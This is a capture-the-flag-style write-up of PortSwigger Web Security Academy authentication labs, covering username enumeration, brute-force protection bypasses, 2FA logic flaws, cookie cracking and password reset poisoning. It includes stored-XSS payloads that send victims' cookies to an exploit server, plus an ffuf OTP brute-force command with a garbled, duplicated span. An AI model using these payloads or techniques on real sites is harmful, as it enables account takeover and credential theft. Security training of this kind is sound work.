![image](https://github.com/user-attachments/assets/91c3b219-8547-456d-9999-42b24f556622)![image](https://github.com/user-attachments/assets/a9e27a81-9b89-4694-8572-052144f1c4b3)![image](https://github.com/user-attachments/assets/07b21e2e-3e7e-4b1d-822e-0a9c56140ed4)## Labs Covered

This write-up focuses on the following **PRACTITIONER-level** labs from the PortSwigger Web Security Academy:

### Username enumeration via subtly different responses  
This lab demonstrates how small differences in server responses during authentication can allow attackers to determine whether a username exists.

### Username enumeration via response timing  
This lab shows how variations in server response times can leak information about the validity of supplied usernames.

### Broken brute-force protection, IP block  
This lab demonstrates how insecure brute-force protection logic can be exploited by alternating between valid logins and attack attempt

### Username enumeration via account lock  
This lab demonstrates how account lockout mechanisms can unintentionally disclose valid usernames to attackers.

### 2FA broken logic  
This lab illustrates how logic flaws in two-factor authentication implementations can allow attackers to bypass 2FA and gain unauthorized access.

### Brute-forcing a stay-logged-in cookie  
This lab shows how weak or predictable session tokens (such as stay-logged-in cookies) can be brute-forced to hijack active user sessions.

### Offline password cracking  
This lab explains how leaked password hashes can be attacked offline using dictionary or brute-force attacks to recover plaintext passwords.

### Password reset poisoning via middleware  
This lab demonstrates how insecure handling of password reset tokens via middleware can be exploited to hijack accounts.

### Password brute-force via password change  
This lab shows how attackers can exploit flaws in password change functionality to brute-force user passwords.

## LAB 4 - Username enumeration via subtly different responses

## Lab Description :

![image](https://github.com/user-attachments/assets/c7f8d431-9e16-4dd4-8953-21f2c69c735e)


## Solution :

We have provided username and password wordlist
We login as **s0mm3r**

![image](https://github.com/user-attachments/assets/de874606-2f76-4741-bf7b-3ceba3aaa115)

So Invalid username or Password from above username.We have get the result

![image](https://github.com/user-attachments/assets/c561d590-37bd-4eb2-bac5-615f08c8aa36)

So we intercept above request through burp and brute force it to get the  username 

![image](https://github.com/user-attachments/assets/6d5338d4-d00f-41dd-990e-ffc3b683ba0a)

As we can see tha all the response has length same but **af** has low length  which is correct username then we will brute force passowrd after getting correct username. 

![image](https://github.com/user-attachments/assets/ee39c174-a4e4-4121-87f9-a2385b399111)


Now update the username to `af` , add the password field as target , add payload of passwords and start the attack.

![image](https://github.com/user-attachments/assets/2da28e86-8982-46a4-aba7-6a774066f548)


We get a `302` status code which indicates that it is the password,We login with these credential then lab will be solved

![image](https://github.com/user-attachments/assets/6e4872c3-7e66-476f-97c4-c7a3197bc438)

---

## LAB 5 - Username enumeration via response timing

## Lab Description :

![image](https://github.com/user-attachments/assets/0e80e66e-641d-4d80-a9f7-8f278e0ec39f)



## Solution :

As a first step, I go to the page and try to log in with some random username and password. As expected, the error message is a geneic

![image](https://github.com/user-attachments/assets/501c09c3-79da-4e27-b1a3-d3b1ed8de5d1)

When I try 5 login attempt,The login is lockout for 30 minutes


![image](https://github.com/user-attachments/assets/7bb37366-43c7-4149-b3bb-a61c770cee40)


**X-Forwarded-For: abc123** will allow for further login attempts. I guess that using a static value there will just lock it up again, so include this value in the intruder. Using the Battering ram attack type, the **X-Forwarded-For** header will contain the username in each request, providing unique values and bypassing the lockout.


![image](https://github.com/user-attachments/assets/001387da-720e-4e84-8b0a-b865a4513327)

```
• Attack type: Battering ram
• Payload: provided username list + wiener

```

Unfortunately, the results are still inconclusive. The response time ranges from 68ms to 132ms. The one known correct username wiener is right in the middle of the response time with 93ms.

The one parameter that is definitely checked for valid usernames is the password field. Try using some absurdly long password (other parameters as above) and see how it goes:


![image](https://user-images.githubusercontent.com/67383098/226357386-aa2570d4-3983-4257-8898-d150bac382f0.png)

We can see that one response has a `302 status code` - `555555` which is the password.Now login and lab will be solved

![image](https://github.com/user-attachments/assets/f45334dc-fbe7-4f6e-aa83-9467a55f0cc0)


---



## LAB 6 - Broken brute-force protection, IP block

## Lab Description : 

![image](https://github.com/user-attachments/assets/c42462d7-c466-498f-9ea2-b8d91d8fb727)

# Overview

## Flawed Brute-Force Protection

Brute-force attacks are a common threat against authentication systems. To mitigate these attacks, most systems implement one or both of the following mechanisms:

- **Account-based Lockout:** Temporarily or permanently locking a specific user account after a predefined number of consecutive failed login attempts.
- **IP-based Blocking:** Blocking or rate-limiting the IP address from which multiple failed login attempts originate within a short time frame.
  
## Solution :
### Observed Behavior

When attempting to log in with invalid credentials (`admin:admin`) twice, the system tracks the failures. On the third attempt, if we log in successfully with a valid account (`wiener:peter`), the IP-based failure counter resets.

This allows us to bypass the protection by alternating between failed login attempts for the target account and successful logins for a known valid account. For example:

1. Attempt login: `admin:admin` → **Fail**
2. Attempt login: `admin:admin` → **Fail**
3. Attempt login: `wiener:peter` → **Success** (resets counter)
4. Attempt login: `admin:admin` → **Fail**
5. Attempt login: `admin:admin` → **Fail**
6. Repeat...

This flaw enables us to brute-force the victim account without ever triggering a block.

---

### Exploit Strategy with Burp Suite (Pitchfork Mode)

To automate this attack using **Burp Intruder**, we use **Pitchfork mode** which allows us to pair two payload sets together — one for the username and one for the password.

#### Steps:

1. Select **Pitchfork** attack type.
2. Choose the `username` and `password` parameters as payload positions.
3. For **Payload Set 1** (username), alternate between the valid username and the victim’s:
    ```
    wiener
    carlos
    wiener
    carlos
    ...
    ```
4. For **Payload Set 2** (password), provide the actual password list:
    ```
    peter
    password1
    peter
    password2
    ...
    ```

![image](https://github.com/user-attachments/assets/a36db50a-8a88-41e4-8693-5b1892db907b)


Each pair in the payloads will:
- Try `wiener:peter` (successfully resets counter)
- Try `carlos:password1` (target account)
- Try `wiener:peter` again (reset)
- Try `carlos:password2`, etc.

---


So we get 302 response in username carlos we can used that to login in


![image](https://github.com/user-attachments/assets/b895b972-d689-4fb2-9f94-bdd114de2af4)

---



## LAB 7 - Lab: Username enumeration via account lock

## LAB DESCRIPTION :

![image](https://github.com/user-attachments/assets/cb1b1677-683e-4737-8111-eb153e9d69cc)

# Overview
## Account locking:
 
 Locking an account offers a certain amount of protection against targeted brute-forcing of a specific account. However, this approach fails to adequately prevent brute-force attacks in which the attacker is just trying to gain access to any random account they can.


 
 > Account locking also fails to protect against `credential stuffing attacks`. 
 
 **Credential Stuffing attack** -
 
This involves using a massive dictionary of username:password pairs, composed of genuine login credentials stolen in data breaches. Credential stuffing relies on 
the fact that many people reuse the same username and password on multiple websites and, therefore, there is a chance that some of the compromised credentials in
the dictionary are also valid on the target website. Account locking does not protect against credential stuffing because each username is only being attempted once.
Credential stuffing is particularly dangerous because it can sometimes result in the attacker compromising many different accounts with just a single automated attack.


## Solution :

Login page:

![image](https://github.com/user-attachments/assets/aeced8de-9184-47a1-af99-1a6dadaf1918)


Let's try to login as an invalid user:

![image](https://github.com/user-attachments/assets/1638f5da-08fe-4be7-90d8-a851d391db6d)


It displays `Invalid username or password`.

![image](https://github.com/user-attachments/assets/754c8502-a819-48ca-83a0-d31d90adb9de)

### What Are Null Payloads?

Null payloads in Burp Suite allow you to send repeated identical requests without modifying any parameter values. As described in Burp Suite documentation:

## Testing with Null Payloads

To verify this behavior, I utilized **null payloads** within Burp Suite Intruder. Null payloads allow sending repeated requests without modifying any part of the base request. This enables us to simulate repeated login attempts without providing any specific username or password combinations.

In this case, I configured Burp Intruder as follows:

- **Attack type:** Sniper (single position targeting username field).
- **Payload type:** Null payload.
- **Number of requests:** 50 consecutive requests with empty payloads.

---



 Repeated requests using invalid or empty usernames did not trigger any lockout or protection mechanism.

![image](https://github.com/user-attachments/assets/f9d9c9ab-324c-4d30-ae92-0b6bf943a193)

The server continued processing each request normally, confirming that the lockout logic is only enforced after multiple failed attempts against *valid usernames*.

It can also be seen that I have 3 attempts before the lockout occurs.


![image](https://github.com/user-attachments/assets/5041beee-2f45-45f3-8fd6-cc4febb31171)

During password testing, we observed the following server responses when attempting multiple login attempts:

- Initially, there are **3 responses** returning the message:  
  > *"Invalid username or password"*

- After exceeding the initial threshold, subsequent requests return:  
  > *"You have made too many incorrect login attempts"*

- Interestingly, at one point, a single response was received **without any error message**, indicating a possible different state. This may suggest:
  - The correct password was attempted.
  - The application reached a different internal handling logic.
  - A potential vulnerability in how failed login attempts are processed.


![image](https://github.com/user-attachments/assets/72849fc2-518a-47f2-b8d1-c3b55bed5246)


Now wait one mintue and the login with username and password lab will be solved

![image](https://github.com/user-attachments/assets/46754689-0c20-4de2-8148-24df82f840c0)


---

## LAB 8 -Lab: 2FA broken logic

## Lab Description :


![image](https://github.com/user-attachments/assets/863308e2-a886-42d2-aa9e-0de281561e9f)


## Solution :


Login in as winer and at will send to mail box

![image](https://github.com/user-attachments/assets/af13d4c7-7202-45a5-a806-574f0677af34)


1445 is otp

![image](https://github.com/user-attachments/assets/eadceb41-08a7-4341-8c44-77566cef1ff9)

Enter otp code and intercept it through burp we  see verify option which mean otp code is wiener we can change it with carlos and the brute
Force otp code through crunch wordlist

![image](https://github.com/user-attachments/assets/ad893dfe-50b2-4f41-8ab9-aa53d12c9a7d)

 now brute force otp

![image](https://github.com/user-attachments/assets/0ed1ee69-1aa0-4da5-b26e-b598bd036fd2)



 
We can see that 302 response and redireted us to login we have suceffully login

![image](https://github.com/user-attachments/assets/d3cd426b-6f02-4955-873a-94ab071fb207)


If you donont have burp pro , used `ffuf` TO FUZZ THE otp faster.


```
ffuf -X POST -u "redacted/login2" -H "Cookie: verify=carlos; session=NB5SwamM383GwnD0MbTv7BXB5WeA3fIv" -H "Content-Type: application/x-www-form-urlencoded" -d "mfa-code=FUZZ" -w s; session=NB5SwamM383GwnD0MbTv7BXB5WeA3fIv" -H "Content-Type: application/x-www-form-urlencoded" -d "mfa-code=FUZZ" -w /home/noah/numbers.txt -fc 400,401,200
```


Enter the OTP of carlos & we have successfully solved the lab.

![image](https://user-images.githubusercontent.com/67383098/226980655-4eb0e0d2-af3c-4769-884b-8d48ad22c47b.png)


---


## LAB 9 -Lab: Brute-forcing a stay-logged-in cookie

## Lab Description :

![image](https://github.com/user-attachments/assets/770bec06-4635-4212-957c-f8b491bbe861)


# Overview

A common feature on many websites is the option to stay logged in even after closing the browser. This is typically presented as a simple checkbox labeled **"Remember me"** or **"Keep me logged in"**.

This functionality is often implemented by generating a **"remember me" token**, which is then stored in a persistent cookie on the user's device.

Some websites mistakenly assume that encrypting the cookie contents makes it secure, even if static values are used. While proper encryption can provide some protection, using simple encoding mechanisms like **Base64** offers **no security at all**, as Base64 is not encryption — it's easily reversible.

Even when proper encryption or hashing is used, the system is not completely secure by default. If an attacker can identify the hashing algorithm used — and **no salt** is applied — they can attempt to brute-force the cookie value by hashing large wordlists and comparing the results.

This vulnerability becomes more serious if the application does not enforce proper rate-limiting on cookie-based authentication attempts. In such cases, attackers may bypass login attempt limits by directly brute-forcing cookie values instead of submitting login forms.

## Solution :

CLick on `My-Account` which takes us to the login page which conatins the **Stay-logged-in cookie**.

![image](https://github.com/user-attachments/assets/794b0a2a-a909-4b96-9fb8-145fb1be3f13)


Login as `wiener:peter`

The request contains a **stay-logged-in=on** parameter.

![image](https://github.com/user-attachments/assets/9535aeb2-77b0-4211-ab35-aa4a9a1d77ee)

The request to `/my-account` included the `stay-logged-in` cookie. Examining the cookie value reveals that it is a Base64-encoded string containing the username and a hash of the password.

![image](https://github.com/user-attachments/assets/e4b6f00c-b936-44f8-ac71-b389e1f6b4c3)

As we can see that **wiener:somehash**

![image](https://github.com/user-attachments/assets/81ba0f46-383c-4a46-a8d7-fc198329e572)

The hash part appeared to be an MD5 hash of the user's password. We copied the hash value and attempted to crack it using an online hash cracking tool. The hash was successfully cracked, revealing the plaintext password for user `wiener`, which is `peter` (the same password we previously entered). 

This confirms that the hash part contains the user's password hashed using MD5.

![image](https://github.com/user-attachments/assets/50538835-85c8-416b-a307-42c05d91980e)


That hash is the  `Md5 hash` of our password - `peter(51dc30ddc473d43a6011e9ebba6ca770)`

Now with the list of passwords given , we'll try to bruteforce carlos's password.
So send the req to intruder.

Add stay-logged-in=$<cookie>$ as payload position .

Add the payloads,

![image](https://github.com/user-attachments/assets/86d7e4d0-0228-4fee-9cfc-0169d6dff1ac)


Under Payload processing, add the following rules in order. These rules will be applied sequentially to each payload before the request is submitted.

   - Hash: `MD5`
   - Add prefix: `carlos:`
   - Encode: `Base64-encode`

![image](https://github.com/user-attachments/assets/5b6ca7f7-ba39-4c94-b496-81f201cdef83)

One of the responses in Intruder had a larger response length, which indicated a valid password attempt. As shown in the image below, this valid response helped us identify the access to Carlos's account.


![image](https://github.com/user-attachments/assets/5860692d-c438-4300-bb6f-9cd5769dd8c7)


So now we got the cookie & the lab is solved.

![image](https://github.com/user-attachments/assets/9c8ee9b4-ecfd-4132-9599-4b7b67a07950)

---

## LAB 10 -Lab: Offline password cracking

## Lab Description :

![image](https://github.com/user-attachments/assets/818fe0ed-83b1-4d81-bf6e-b4d66f06e3ce)


## Solution

For this, I log in with the known credentials for ***wiener** in this case, the login functionality which contains stay-logged-in checkbox

![image](https://github.com/user-attachments/assets/a40ac017-527a-4c0f-a7d5-308af1f06afb)


Like in the previous lab, the lab uses a `stay-logged-in cookie`,Decode stay-logged-in cookie with base64 of above request as shown in below image

![image](https://github.com/user-attachments/assets/6e7902b3-47d9-488e-a928-7a89c47ffef8)

A quick check confirms that the hash represents the password in MD5 format.

Next, I proceeded to find the XSS vulnerability. The page allows users to write comments with four input fields: `comment`, `name`, `email`, and `website`.

I started by injecting basic test payloads in both the `comment` and `name` fields. The tests revealed that the `comment` field is vulnerable to XSS injection.

For example, injecting the following payload triggered the XSS:

```html
<script>alert(document.location)</script>
```


![image](https://github.com/user-attachments/assets/ca8c95df-f0ca-4dbd-92b3-876de9e75d43)

So can used stored XSS payload in the comment section,which will send request to  exploit server of website


```js
<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
```
or we can used below payload

```html
<script>
fetch('https://exploit-0a8c008a03da770bc09ca69d015400e1.web-security-academy.net/' + document.cookie, {
  method: 'GET'
});
</script>
```

![image](https://github.com/user-attachments/assets/6aea3287-c32c-4fe5-af9e-743aed294ebb)


We can also used burp collabrator if not want to used exploit server

![image](https://github.com/user-attachments/assets/2cd39ff4-9932-4034-af24-2d8627b2b91c)


Sure enough, the server log reveals that someone that is not me looked at the page:

![image](https://github.com/user-attachments/assets/31fd73c7-e727-4073-9482-eae0d7eb1bad)

It is the base64 encoded form of user carlos and his MD5 hash of his password. - `carlos:26323c16d5f4dabff3bb136f2460a943`


The internet has a lot of hash cracker websites, using crackstation the value of the password is quickly found.

![image](https://github.com/user-attachments/assets/2ac00a3f-e8a9-4f67-8145-aed7be048f52)

Now we can log in as carlos & delete the account to solve the lab.

![image](https://github.com/user-attachments/assets/486c0f6b-c464-4a5e-b015-b6131b1cd566)

---


## LAB 11 -Password reset poisoning via middleware

## Lab Description :

![image](https://github.com/user-attachments/assets/5709e40a-8b8d-441a-b5f3-2eae5900b8f4)


## Overview

Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link that points to a domain under the attacker's control.

Normally, the password reset flow works as follows:

1. The user requests a password reset.
2. The server generates a password reset link containing a token and sends it to the user's registered email address.
3. The user clicks the link and resets their password.

## Solution

The lab is a blog website.

![image](https://github.com/user-attachments/assets/e3770f3d-1f59-4e78-a2eb-48f4dd0793a4)

Clicking on **My Account** redirects us to the login page.

![image](https://github.com/user-attachments/assets/5e0f7912-5f87-4cb3-a49f-08624e6a3dc7)


When we click on **Forgot Password**, the browser sends a `POST` request to `/forgot-password` with the following parameter:

![image](https://github.com/user-attachments/assets/f1d7ab0a-bcf1-4336-aae3-20cd3a49c66a)

Here’s the email we received, with the reset token highlighted. This token is unique to our user. If someone else were to obtain this token, they would be able to reset our password and potentially take over the account.

![image](https://github.com/user-attachments/assets/2b44229f-f869-4705-9e22-56a2714e7865)

If we click the link in the email, we are taken to a password reset form where we can reset our password.

We can also submit Carlos' username in the original password reset form, but since we don't have access to his email account, we won’t receive his reset email. Therefore, we need to find another way to intercept the request made for Carlos’ account and capture the token associated with his password reset.

The `POST` request to the `/forgot-password` endpoint is the starting point of this workflow. Below is the original request as seen in Burp Suite:

![image](https://github.com/user-attachments/assets/7a0a5d5c-82c6-4f13-8561-74e61e14eb41)

If we replace the Host header with another website name, like this:

![image](https://github.com/user-attachments/assets/bbc6d84c-8486-41da-930b-1117ec18b9f6)

The request still goes through successfully, and we receive a new email. However, this time, the URL in the email (which we would normally click to reset our password) points to the wrong domain name — our attacker-controlled domain.

This forms the basis of our attack path for this lab:

1. We submit a `POST` request to `/forgot-password` for Carlos' account, but we modify the `Host` header to point to our exploit server's URL.
2. The server generates a password reset link using the value in the `Host` header and sends this poisoned link to Carlos.
3. When Carlos clicks the link in his email, his browser makes a request to our exploit server, and the full URL (including the reset token) is logged


## Method 2

First we do same  as first lab change host header to our exploit serverit gives us error.

![image](https://github.com/user-attachments/assets/30c3ccb6-fb8d-4d54-838f-d28129913951)

Now I send with **@** but it did not work

![image](https://github.com/user-attachments/assets/ad073c14-fdf8-4b85-ba62-c71332d42406)

A **reverse proxy** acts as an intermediary server positioned between clients and one or more backend servers. Unlike a **forward proxy** (which helps clients access the internet), a reverse proxy sits in front of servers, receiving client requests and directing them to the correct backend server.

---

### Exploiting X-Forwarded-Host in a Password Reset Scenario

When attempting to manipulate the `Origin` and `Referer` headers for a password reset, you might find that the reset email's URL remains unchanged. However, upon inspecting common headers, the **`X-Forwarded-Host`** header often stands out.

The `X-Forwarded-Host` header is crucial in environments using reverse proxies. It identifies the original `Host` header sent by the client, especially when proxies might alter other headers.

Here's a breakdown of how this can be exploited:

1.  **Capture the Password Reset Request:** Intercept the initial password reset request.
2.  **Add `X-Forwarded-Host` Header:** Using a tool like Burp Repeater, add an `X-Forwarded-Host` header to the intercepted request. This header should point to your exploit server.
3.  **Send the Modified Request:** Forward the request with the added `X-Forwarded-Host` header.
4.  **Observe the Result:** When the password reset email is generated, the `X-Forwarded-Host` header often influences the URL within the email, directing the password reset link to your exploit server.

In the described scenario, sending a password reset request for the username `carlos` with a crafted `X-Forwarded-Host` header led to the successful resolution of the lab. This demonstrates how misconfigurations or improper handling of `X-Forwarded-Host` in reverse proxy setups can be leveraged for malicious purposes.

![image](https://github.com/user-attachments/assets/968375df-41ab-445d-9178-b5ab41568c69)

We get carlo Password change token.

![image](https://github.com/user-attachments/assets/67fba0bc-63d1-4914-b7b9-5c00783e273b)

We copied the token obtained from the exploit server and used it in the password reset form. This allowed us to set a new password for Carlos' account.

After successfully changing the password, we logged in as Carlos using the new credentials, and the lab was successfully solved.


![image](https://github.com/user-attachments/assets/df4ac617-d93b-4f69-9691-f079fd0d46c0)

As we can see that lab is solved

![image](https://github.com/user-attachments/assets/29708d40-96bc-49e3-8119-25d652b9a830)

---


## Lab 12 : Lab: Password brute-force via password change

## Lab Description :

![image](https://github.com/user-attachments/assets/50362876-be65-4467-b2e2-7d4e7c86e36b)


## Solution

We first navigated to the login page and entered the test credentials `wiener:peter` to log in and test the functionality.

After logging in, we were redirected to a page where we could change our current password.

**Upon inspecting the source code of the page, we observed that the username `wiener` is embedded directly in the form. This indicates that the username value is taken from client-side input, and therefore, i**


![image](https://github.com/user-attachments/assets/8de5694e-57c8-4357-a770-0d04e4dee7fc)


![image](https://github.com/user-attachments/assets/a155ad82-a40e-47d0-b2ed-4cb5546c9151)


## Summary of Test Cases

| Test Case | Current Password | New Password 1 | New Password 2 | Server Response | Result |
|-----------|-------------------|----------------|----------------|------------------|--------|
| **Case 1** | Correct | New password A | New password B (different) | `New passwords do not match` | Current password is correct |
| **Case 2** | Correct | New password A | New password A (same) | `Password changed successfully!` | Password successfully changed |
| **Case 3** | Incorrect | New password A | New password B (different) | `Current password is incorrect` | Password guess failed |
| **Case 4** | Incorrect | New password A | New password A (same) | Account gets locked | Account lockout triggered |

## Key Observation

- When using **different new passwords**, the server checks the current password first.
- If the current password is correct, but new passwords don’t match, we get `New passwords do not match` — confirming that the current password guess is valid.
- This allows safe brute-forcing without locking the account by always sending two different new passwords.


Case 1. 

![image](https://github.com/user-attachments/assets/73e2e160-4f2e-4317-bfc6-056b0d634ffa)


Case 2. 

![image](https://github.com/user-attachments/assets/fd77ac71-095e-49a4-9795-0f8bd1adc5da)


Case 3 

![image](https://github.com/user-attachments/assets/cd50f086-9c52-4a7a-b821-68001e20f6d2)


Case 4 

![image](https://github.com/user-attachments/assets/6e8e37ba-5a93-42fd-b894-0cd9f3a1ec81)


To bruteforce carlos's password , send the request to intruder & change the username parameter to `username=carlos` & add `current-password=$peter` as payload part with **2 differnt newpassword**.

Paste the given usrename list in lab as payload.

![image](https://github.com/user-attachments/assets/5640ae6b-bf46-43bc-bf6d-e7ee1054dd94)


If the current password is right it will display - `New passwords do no match`
Else we get - `current password is incorrect`

![image](https://github.com/user-attachments/assets/714b4eb1-0a3c-42c6-a18d-295a08ca129b)


After the attack is complete, we can grep for the word **new passwords do not match**. We got the password of carlos as `dragon`.

![image](https://github.com/user-attachments/assets/c90c54df-3e62-426f-aeb6-a5a7422cdedf)


Now login as carlos - `carlos:dragon` to solve the lab.


![image](https://github.com/user-attachments/assets/c79e9cad-5792-4b25-9974-f26669b9e6ba)
